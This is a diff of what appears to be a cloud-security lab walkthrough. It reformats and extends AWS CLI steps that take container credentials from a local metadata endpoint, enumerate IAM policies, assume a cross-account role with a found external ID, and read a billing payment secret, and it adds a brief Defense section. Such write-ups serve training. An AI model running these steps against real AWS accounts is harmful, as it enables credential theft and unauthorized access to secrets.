@@ -24,15 +24,19 @@ aws sts get-caller-identity
 	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
 	aws secretsmanager get-secret-value --secret-id ext/cost-optimization
 ```
-
-AWS CLI Credentials (using cloud shell)
+* AWS CLI Credentials (using cloud shell)
+```
 	TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
 	curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
-Policies attached to this user
+```
+* Policies attached to this user
+```
 	aws iam list-attached-user-policies --user-name ext-cost-user
 	aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
 	aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
-Roles attached to a policy attached to this user (Ressources: "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess") -> 
+```
+* Roles attached to a policy attached to this user (Ressources: "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess")
+```
 	aws iam get-role --role-name ExternalCostOpimizeAccess
 		 "Effect": "Allow",
                     "Principal": {
@@ -44,7 +48,9 @@ Roles attached to a policy attached to this user (Ressources: "arn:aws:iam::4276
                             "sts:ExternalId": "37911"
                         }
                     }
-Policies attached to this role
+```
+* Policies attached to this role
+```
 	aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess
 	aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment
 		"Action": [
@@ -53,11 +59,18 @@ Policies attached to this role
                         "secretsmanager:ListSecretVersionIds"
                     ],
 		"Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
-Assume role 
+```
+* Assume role 
+```
 	aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
 	aws sts get-caller-identity
 	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
 	aws configure
 	aws-enumerator creds
+	aws secretsmanager get-secret-value --secret-id billing/hl-default-payment
+```
 	
+## Defense
 
+* Store configuration files outside of the world-readable web root.
+* When creating test policies, use IAM users and roles that are dedicated to testing and do not already serve an operational or business purpose.
